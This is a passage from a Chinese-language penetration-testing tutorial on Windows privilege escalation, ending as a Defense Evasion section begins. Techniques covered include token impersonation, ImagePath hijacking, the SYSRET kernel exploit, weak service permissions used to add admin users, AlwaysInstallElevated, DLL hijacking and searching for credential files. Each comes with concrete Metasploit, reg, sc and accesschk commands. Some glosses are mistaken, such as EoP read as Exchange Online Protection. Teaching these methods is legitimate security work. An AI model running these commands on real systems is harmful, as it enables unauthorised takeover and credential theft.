    或者，如果服务作为管理员等高权限用户运行，或者如果服务允许用户通过Windows
    身份验证进行连接（即SQL Server 允
> 许），则可以通过模拟管理员帐户的令牌来升级权限。
> 就是以管理员身份运行的Apache 服务
如何以管理员身份运行apache 服务？可以使用Metasploit 或直接通过MWR
Infosecurity 工具，在参考资料中下载：incognito2 还可以使用PowerSploit
工具的Invoke-TokenManipulation 功能，请阅读参考资料：Invoke-
TokenManipulation
以上细节实战步骤请阅读参考资料：token 操作
####### 不安全的注册表权限
windows
中，在向系统注册注册服务时，将在注册表中创建包含二进制路径的新密钥。
攻击向量：利用以上原理带来的安全问题，被学者们称作为一个向量。
这可能不是很常见，默认情况下只向管理员授予，修改服务注册表项的写访问权，
但在渗透测试中不应该省略。
通过这种配置缺陷进行权限提升的过程非常简单。可以在以下注册表路径中找到系统上运行的服务的注册表项：
> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services
如果标准用户有权修改包含应用程序二进制文件路径的注册表项\"ImagePath\" ，
比如当apache 服务在这些权限下运行时，他可以将权限提升到system。
如果您对Image（图像，镜像，扇区逐比特拷贝，原始二进制数据，取证成像）单词感兴趣，可以阅读文末参考资料：磁盘Image
exp：添加一个注册表项，将ImagePath 更改为存储恶意负载的位置。
> meterpreter \> shell Process 1812 created.
>
> Channel 1 created.
>
> Microsoft Windows \[Version 6.1.7601\]
>
> Copyright (c) 2009 Microsoft Corporation. All rights reserved.
>
> C:\\Users\\pentestlab\\Desktop\>reg add
> \"HKEY_LOCAL_MACHINE\\SYSTEM\\Control Set001\\Services\\Apache\"
>
> /t REG_EXPAND_SZ /v ImagePath /d \"C:\\xampp\\pentestlab2.exe\" /f
>
> reg add
> \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Apache\"
>
> /t REG_EXPAND_SZ /v ImagePath /d \"C:\\xampp\\pentestlab2.exe\" /f
>
> The operation completed successfully.
重启服务来触发有效负载，它将以system 形式返回meterpreter
会话。以上所有知识细节，请阅读文末参考资料：不安全的注册表权限
参考资料： 磁盘Image：https://en.wikipedia.org/wiki/Disk_image
不安全的注册表权限：https://pentestlab.blog/2017/03/31/insecure-registry-
permissions/
####### GET SYSRET
由于处理器AMD 和Intel 之间的实现差异，此漏洞允许攻击者执行内核代码
（ring0）。例如，根据AMD 规范编写但在Intel
硬件上运行的操作系统容易受到攻击。由于攻击者可以在内核中执行代码，因此可以允许他将权限从用户级别升级到系统。
由于Windows 用户模式调度程序处理系统请求的方式，Windows
环境容易受到攻击。此问题会影响在Intel 芯片上运行的 64 位版本的Windows
2008 和Windows 7。
-   metasploit
在Meterpreter 会话中，需要首先在目标系统上上载sysret
二进制文件，然后通过将其附加到当前进程来执行权限提升漏洞利用。
> meterpreter \> getuid meterpreter \> getpid
>
> meterpreter \> execute -H -f sysret.exe -a \"-pid 2348\"
-   Windows
或者，如果用户具有对系统的物理访问权限或通过RDP，则可以使用以下过程来升级其权限。
1.获取正在运行的进程及其相关PID 的列表
> whoami tasklist
2.  explorer.exe 时用于挂钩的理想过程
3.  使用 -pid 参数运行二进制sysret.ext，它将绕过内核代码签名将shellcode
    执行到内核中。
> sysret.exe -pid 1596
再次检查命令提示符，用户将升级到system
> whoami
参考资料： sysret：https://github.com/shjalayeri/sysret 英特尔SYSRET：
https://pentestlab.blog/2017/06/14/intel-sysret/ 彩蛋进修，bugcrowd
大学：https://[www.bugcrowd.com/hackers/bugcrowd-university/](http://www.bugcrowd.com/hackers/bugcrowd-university/)
hackerOne101
的培训已文明于全球，这里就不需要再推了。所有你知道的大企业都在关注它，包括微软。
####### 20.权限提升 20 提权基础
> **Windows 权限提升基础之实用的 Windows 权限提升**
-   安全对象：文件，目录，服务，注册表项，命名管道。
-   discretionary access control list（DACL） Access Control Entries
> （ACE）
-   access
    token：用户安全信息的容器，SID，groups，privileges，绑定的进程或线程。
-   强制完整性控制：安全功能post-vista，分配流程完整性级别，表示对象的可信度
-   windows 完整性等级：S-1-16-0x1000（十进制为 4096），参考资料：
    Windows 操作系统中众所周知的安全标识符
-   在工作站上登陆 SKYNET\\Luigi via \$method Luigi
    用户有一个最小权限，没有本地权限，它可以运行宏，利用这个exp
    降落到工作站中。
-   升级游戏：有没有别的管理，信任文件，利用exp，利用不安全的配置/应用
> （本地组策略的配置中：弱服务DACLs，弱文件DACLs，
> AlwaysInstallElevated，DLLs）
-   其他地方？：Luigi 是域用户组，管理员中有 1 个域名用户
-   powerview：
    github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerVie
    w.ps1 find-LocalAdminAccess
> cd Desktop
>
> powershell -exec bypass import-module .\\powerview.ps1
> Find-LocalAdminAccess
>
> net localgroup administrators
-   creds in files 文件中的凭证：
> C:\\users\\luigi\\Desktop\\passwords.xls C:\\\>dir /b /s web.config
>
> C:\\\>dir /b /s unattend.xml C:\\\>dir /b /s sysprep.inf C:\\\>dir /b
> /s sysprep.xml C:\\\>dir /b /s \*pass\*
>
> GPP
>
> \* \\\\mushroomkindgom\\SYSVOL\\???
windows Eop Buggzz：请阅读参考资料：什么是Exchange Online Protection
（EOP）
-   枚举丢失的补丁 metasploit 内的两个模块
    -   post/windows/gather/enum_patches
    -   post/multi/recon/localexploitsuggester
-   Pwn ms13-053
> sessions -i 12
>
> sessions -i 13
>
> getuid getprivs background
>
> use exploit/windows/local/ppr_flatten_rec set session 13
>
> set lport 443 exploit getuid getprivs
-   weak service permissions 弱服务权限
    如果盒子补丁完全修补，可以看看注册表弱配置，大多数是system
    权限运行。
    搜索注册表对象中的命令管道进程或线程，配置中的任何用户，小组，搜索每一项服务。
    快速识别任何未命中配置。您可能会使用第三方服务，这只是XP
    早期服务的例子
> Accesschk.exe -qwcu \"Authenticated Users\" \* Accesschk.exe -qwcu
> \"Users\" \* Accesschk.exe -qwcu \"Everyone\" \*
我们可以编辑服务配置吗？ 我们可以编辑它指向的二进制文件?
> sc qc codemeter.exe
>
> net user
>
> net user bob b0bbytables1 /add
>
> sc config codemeter.exe binpath= \"net user bowser b0ws3r! /add\" sc
> start codemeter.exe
>
> sc config codemeter.exe binpath= \"net localgroup administrators
> bowser /e\" 这里自己调试一下/e 参数，可能不是它
>
> sc start codemeter.exe net user
>
> net user bowser
-   weak file permissions 弱文件权限
look for writeable files 寻找可写的文件 \* autoruns？自动运行
> \* scheduled tasks？计划任务
> 这是配置错误的文件，找第三方软件引入的缺陷。
>
> Accesschk.exe -qwsu \"Authenticated Users\" c:\\ Accesschk.exe -qwsu
> \"Users\" c:\\ Accesschk.exe -qwsu \"Everyone\" c:\\
main app binary writeable users 可写用户的主应用二进制程序 autorun on
login 登陆时自动运行 nah bro，UAC UAC 不是安全边界 安全架构中不要将UAC
作为安全框架 admin logs in 管理员登陆 backdoored binary auto-executes
自动执行的后门二进制 code execution at medium IL as admin（UAC）
-   AlwaysInstallElevated 永远安装提升
> 类似于是否安装到默认路径的一种提示，交互点是勾选框框
组策略设置使安装包（.msi）变得方便，使用system 安装MSI 包文件 使用CMD
命令，看看注册表是否有这个配置
> reg query
> HKLM（或HKCU）\\SOFTWAR\\Policies\\Microsoft\\Windows\\Installer /v A
> lwaysInstallElevated
msf
> session -i 4 getuid
>
> shell
>
> reg query
> HKLM（或HKCU）\\SOFTWAR\\Policies\\Microsoft\\Windows\\Installer /v A
> lwaysInstallElevated
>
> exit exit
>
> background
>
> use exploit/windows/local/always_install_elevated set session 4
>
> set lport 443
>
> exploit getuid
-   DLL Hijacking
windows can dynamically load DLLs Windows 可以动态加载DLL if full path
not used/missing,windows executes DLL Search Order
如果未使用/缺少完整路径，则Windows 执行DLL 搜索顺序
例如：loadLibrary(\"ohnoes.dll\") VS LoadLibrary(\"c:\\program
files\\ohnoes.dll\") 1.The directory from which the application
loaded.加载应用程序的目录。 2.The system directory 系统目录3.The 16-bit
system directory
4.the windows directory 5.the current directory 当前目录 6.the
directories listed in the PATH environment variable PATH
环境变量中列出的目录
特权应用程序加载缺少DLL + 可控搜索路径元素 = pwned
-   pwned 和pwn
    是同一个意思，流行于游戏文件中的嘲讽短语，你刚刚被击败！妥协，控制等。
Use Sysinternals Procmon 使用Sysinternals
的产品，进程监视器，微软官网下载 \* include \".dll\" \* include \"NAME
NOT FOUND\" \* inclued folder in path
> use exploit/windows/local/ikeext_service set dir c:\\\\python27
>
> set session 19 exploit -j
>
> sessions -c \"shutdown /r /t 00\" sessions -i 20
>
> getuid getprivs
tools
-   Powerup
-   windows-privesc-check
-   sysinternals suite
参 考 资 料 ： Windows 权 限 提 升 基 础 ：
 实用的Windows
权限提升：
https://[www.youtube.com/watch?v=PC_iMqiuIRQ](http://www.youtube.com/watch?v=PC_iMqiuIRQ)
Windows
操作系统中众所周知的安全标识符:https://support.microsoft.com/en-us/help/243330/well-
known-security-identifiers-in-windows-operating-systems 什么是Exchange
Online Protection（EOP）：https://docs.microsoft.com/en-
us/office365/securitycompliance/eop/what-is-eop
# 五.Defense Evasion
防御逃避包括对手可能用来逃避侦查或避免其他防御的技术。有时，这些行为与其他类别的技术相同或不同，这些技术具有颠覆特定防御或缓解的额外好处。防御逃避可被视为对手应用于操作的所有其他阶段的一组属性。
LOLBAS(Living Off The Land Binaries and Scripts)，主要是利用Microsoft
签名的文件，包括操作系统的本机文件和Microsoft